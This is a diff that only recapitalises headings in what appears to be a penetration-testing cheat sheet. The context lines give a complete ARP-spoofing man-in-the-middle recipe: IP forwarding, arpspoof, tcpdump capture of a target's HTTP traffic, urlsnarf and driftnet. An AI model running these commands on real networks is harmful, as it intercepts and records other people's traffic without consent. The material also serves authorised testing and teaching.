@@ -1,4 +1,4 @@
-### forward IPV4 traffic
+### Forward IPV4 traffic
 ```
 echo 1 > /proc/sys/net/ipv4/ip_forward
  
@@ -6,17 +6,17 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 arpspoof -i <interface> -t <rhost> -r <gatewayIp>
 ```
 
-### dump TCP traffic
+### Dump TCP traffic
 ```
 tcpdump -i <interface> -A host <rhost> and port 80 > <rhost.txt>
 ```
 
-### extract urls from TCP traffic
+### Extract urls from TCP traffic
 ```
 urlsnarf -i <interface>
 ```
 
-### capture images
+### Capture images
 ```
 driftnet -i <interface>
 ```
